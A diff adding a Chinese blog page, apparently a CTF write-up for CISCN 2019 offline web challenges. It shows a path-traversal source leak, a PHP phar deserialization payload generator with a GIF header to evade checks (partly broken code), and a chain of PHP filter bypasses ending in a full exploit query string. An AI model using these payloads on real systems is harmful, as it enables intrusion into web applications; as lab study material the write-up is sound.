@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>ciscn2019华北赛区线下赛web wp - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=writeups>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">ciscn2019华北赛区线下赛web wp</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#day1"><span class="toc-text">day1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web1"><span class="toc-text">web1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#day2"><span class="toc-text">day2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web1-1"><span class="toc-text">web1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web2"><span class="toc-text">web2</span></a></li></ol></li></ol>
+
+  <div class="post-content">
+    <p>题目:<br><a href="https://github.com/neuqcsa/ctf/tree/master/ciscn2019_%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%E7%BA%BF%E4%B8%8B%E8%B5%9B" target="_blank" rel="noopener">https://github.com/neuqcsa/ctf/tree/master/ciscn2019_%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%E7%BA%BF%E4%B8%8B%E8%B5%9B</a></p>
+<h2 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>这道题考察的是phar反序列化<br>参考:<a href="https://www.cnblogs.com/iceli/p/9564061.html" target="_blank" rel="noopener">https://www.cnblogs.com/iceli/p/9564061.html</a><br>在下载的时候抓包把filename改成../../xxx.php可以得到源代码<br>可以发现在delete.php里的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>把$filename传给了open方法<br>在class.php中有</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">       <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>$filename最终被传给了file_exists()<br>而file_exists()是可以触发phar反序列化的<br>于是用这段代码生成phar文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $filename = <span class="string">"/flag.txt"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $db;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $files;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//生成对应可被利用的对象</span></span><br><span class="line">    $o = <span class="keyword">new</span> foo();</span><br><span class="line">　　 $o-&gt;ha=<span class="string">'echo "error";'</span>;</span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h2><h3 id="web1-1"><a href="#web1-1" class="headerlink" title="web1"></a>web1</h3><p>绕过空格</p>
+<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>这其实是2019北邮中学生网安杯一道题改过来的，难度还是降低了的(参见<a href="https://www.anquanke.com/post/id/170299" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170299</a>)</p>
+<p>通过index.php底下的hint可以看出存在文件包含，<br>直接用?src=xxx就能拿到index.php的源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Null</span> ... <span class="keyword">Null</span> ... <span class="keyword">Null</span> ... &lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- ?src --&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Null          ...            Null            ...            Null          ...  "</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(highlight_file(<span class="string">'index.php'</span>, <span class="keyword">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>($_REQUEST)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($_REQUEST <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))   <span class="keyword">die</span>(<span class="string">'Hello Hack.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>($_SERVER)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/cyber|flag|ciscn/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>]))  <span class="keyword">die</span>(<span class="string">'Hello Hack..'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'cyber'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(substr($_GET[<span class="string">'cyber'</span>], <span class="number">32</span>) === md5($_GET[<span class="string">'cyber'</span>])))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Hello Hack...'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/^ciscnsec$/'</span>, $_GET[<span class="string">'ciscn'</span>]) &amp;&amp; $_GET[<span class="string">'ciscn'</span>] !== <span class="string">'ciscnsec'</span>)&#123;</span><br><span class="line">            $getflag = file_get_contents($_GET[<span class="string">'flag'</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Hello Hack....'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($getflag) &amp;&amp; $getflag === <span class="string">'security'</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'Hello Hack.....'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以看到需要绕过几个地方</p>
+<ol>
+<li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*$_REQUEST是包含了 $_GET，$_POST 和 $_COOKIE 的数组*/</span></span><br><span class="line"><span class="keyword">if</span>($_REQUEST)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($_REQUEST <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        <span class="comment">/*禁止value中出现字母*/</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]/i'</span>, $value))   <span class="keyword">die</span>(<span class="string">'Hello Hack.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+php是按照环境变量，get参数，post参数这样的顺序去解析$_REQUEST的，</li>
+</ol>
+<p>所以只要post提交一个同名的参数，其值为数字，这样同名的get参数就可以包含字母了</p>
+<ol start="2">
+<li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER)&#123; </span><br><span class="line">    <span class="comment">/*$_SERVER['QUERY_STRING']是url后面get参数的部分*/</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/cyber|flag|ciscn/i'</span>, $_SERVER[<span class="string">'QUERY_STRING'</span>]))  <span class="keyword">die</span>(<span class="string">'Hello Hack..'</span>);</span><br><span class="line">    <span class="comment">/*这里禁止get参数中出现cyber,flag,ciscn，但根据后面的代码我们必须要有这三个get参数*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里利用的是$_SERVER[‘QUERY_STRING’]是不会进行url解码的,所以只要把cyber,flag,ciscn进行url编码即可绕过</p>
+</li>
+<li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*要求cyber参数的前32位和它的md5相同*/</span></span><br><span class="line"><span class="keyword">if</span>(!(substr($_GET[<span class="string">'cyber'</span>], <span class="number">32</span>) === md5($_GET[<span class="string">'cyber'</span>])))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Hello Hack...'</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里可以用数组绕过,传入cyber[]=x(注意cyber要url编码)<br>(这种绕过方法要求php版本在5.3以上)</p>
+</li>
+<li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*ciscn参数必须匹配正则^ciscnsec$但又不能直接是ciscnsec*/</span></span><br><span class="line"> <span class="keyword">if</span>(preg_match(<span class="string">'/^ciscnsec$/'</span>, $_GET[<span class="string">'ciscn'</span>]) &amp;&amp; $_GET[<span class="string">'ciscn'</span>] !== <span class="string">'ciscnsec'</span>)&#123;</span><br><span class="line">            $getflag = file_get_contents($_GET[<span class="string">'flag'</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Hello Hack....'</span>);</span><br></pre></td></tr></table></figure>
+<p>/^ciscnsec$/没有加修饰符D，当字符串以一个换行符结尾时， 美元符号还会匹配该换行符，<br>因此在ciscnsec的url编码后面加%0a(换行符的url编码)绕过</p>
+</li>
+</ol>
+<p>5.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^ciscnsec$/'</span>, $_GET[<span class="string">'ciscn'</span>]) &amp;&amp; $_GET[<span class="string">'ciscn'</span>] !== <span class="string">'ciscnsec'</span>)&#123;</span><br><span class="line">            $getflag = file_get_contents($_GET[<span class="string">'flag'</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Hello Hack....'</span>);</span><br><span class="line">        <span class="comment">/*要让$getflag的值为security*/</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($getflag) &amp;&amp; $getflag === <span class="string">'security'</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'Hello Hack.....'</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>使用data://伪协议<br>传入flag=data:text/plain,security</p>
+<p>最终的payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?%66%6c%61%67&#x3D;data:text&#x2F;plain,security&amp;%63%79%62%65%72[]&#x3D;x&amp;%63%69%73%63%6e&#x3D;%63%69%73%63%6e%73%65%63%0a</span><br><span class="line">同时post提交flag&#x3D;123&amp;ciscn&#x3D;123</span><br></pre></td></tr></table></figure>
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2019-06-10</span>
+  </div>
+
+  <div class="post-footer">
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/writeups/" rel="tag">writeups</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2022
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
